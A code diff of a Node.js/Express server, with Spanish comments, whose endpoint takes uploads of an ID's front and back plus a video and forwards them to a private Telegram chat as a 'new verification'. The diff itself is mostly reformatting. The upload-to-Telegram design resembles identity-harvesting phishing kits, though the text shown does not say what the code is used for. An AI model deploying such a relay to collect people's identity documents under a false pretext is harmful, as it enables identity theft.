@@ -5,14 +5,10 @@ const FormData = require('form-data');
 const path = require('path');
 
 // --- Configuración de Seguridad ---
-// Render tomará estas variables de tu panel de "Environment"
+// Estas variables se leen del entorno (Render / hosting)
 const BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
 const CHAT_ID = process.env.TELEGRAM_CHAT_ID;
 
-// --- URLs de la API de Telegram ---
-// Mover la lógica de construcción de URL dentro del 'try'
-// para que el servidor inicie incluso si las variables de entorno 
-// aún no están configuradas (pero fallará en la solicitud).
 const TELEGRAM_API_BASE_URL = `https://api.telegram.org/bot${BOT_TOKEN}`;
 const SEND_PHOTO_URL = `${TELEGRAM_API_BASE_URL}/sendPhoto`;
 const SEND_VIDEO_URL = `${TELEGRAM_API_BASE_URL}/sendVideo`;
@@ -22,26 +18,23 @@ const port = process.env.PORT || 3000;
 
 // Configuración de Multer para recibir 3 archivos EN MEMORIA
 const storage = multer.memoryStorage();
-const upload = multer({ 
+const upload = multer({
     storage: storage,
-    limits: { fileSize: 50 * 1024 * 1024 } // Límite de 50MB por archivo
+    limits: { fileSize: 50 * 1024 * 1024 } // 50MB por archivo
 });
 
 // --- Servir los archivos del Frontend ---
-// Sirve todo lo que esté dentro de la carpeta 'public'
 app.use(express.static(path.join(__dirname, 'public')));
 
-// --- El Endpoint de Subida ---
+// --- Endpoint de subida ---
 app.post(
-    '/api/enviar-a-telegram', 
-    // Espera 3 campos de archivo específicos
+    '/api/enviar-a-telegram',
     upload.fields([
         { name: 'idFront', maxCount: 1 },
         { name: 'idBack', maxCount: 1 },
         { name: 'video', maxCount: 1 }
-    ]), 
+    ]),
     async (req, res) => {
-        
         console.log("Recibiendo archivos...");
 
         // 1. Validar que TODOS los archivos existan
@@ -49,18 +42,25 @@ app.post(
             console.error("Error: No se recibieron los 3 archivos esperados.");
             return res.status(400).send({ error: 'Faltan archivos (se esperan 3).' });
         }
-        
+
         // 2. Validar que las variables de entorno estén cargadas
         if (!BOT_TOKEN || !CHAT_ID) {
-             console.error("Error 500: Las variables de Telegram no están configuradas en el servidor.");
-             return res.status(500).send({ error: 'Error de configuración interna del servidor.' });
+            console.error("Error 500: Las variables de Telegram no están configuradas en el servidor.");
+            return res.status(500).send({ error: 'Error de configuración interna del servidor.' });
         }
 
         try {
-            // Obtenemos los 'buffers' (archivos en memoria)
             const idFrontFile = req.files.idFront[0];
             const idBackFile = req.files.idBack[0];
             const videoFile = req.files.video[0];
+
+            console.log('Tamaños recibidos:',
+                {
+                    front: idFrontFile.size,
+                    back: idBackFile.size,
+                    video: videoFile.size
+                }
+            );
 
             const caption = `Nueva verificación recibida.`;
 
@@ -70,7 +70,7 @@ app.post(
             formFront.append('chat_id', CHAT_ID);
             formFront.append('caption', `[FRENTE] ${caption}`);
             formFront.append('photo', idFrontFile.buffer, { filename: 'id_front.jpg' });
-            
+
             await axios.post(SEND_PHOTO_URL, formFront, {
                 headers: formFront.getHeaders()
             });
@@ -81,7 +81,7 @@ app.post(
             formBack.append('chat_id', CHAT_ID);
             formBack.append('caption', `[TRASERO] ${caption}`);
             formBack.append('photo', idBackFile.buffer, { filename: 'id_back.jpg' });
-            
+
             await axios.post(SEND_PHOTO_URL, formBack, {
                 headers: formBack.getHeaders()
             });
@@ -98,12 +98,12 @@ app.post(
             });
 
             console.log("¡Todos los archivos enviados a Telegram con éxito!");
-
-            // 6. Responder al frontend con éxito
             res.status(200).send({ success: true, message: 'Archivos enviados.' });
-
         } catch (error) {
-            console.error("Error al enviar archivos a Telegram:", error.response ? error.response.data : error.message);
+            console.error(
+                "Error al enviar archivos a Telegram:",
+                error.response ? error.response.data : error.message
+            );
             res.status(500).send({ error: 'Error interno al procesar los archivos.' });
         }
     }
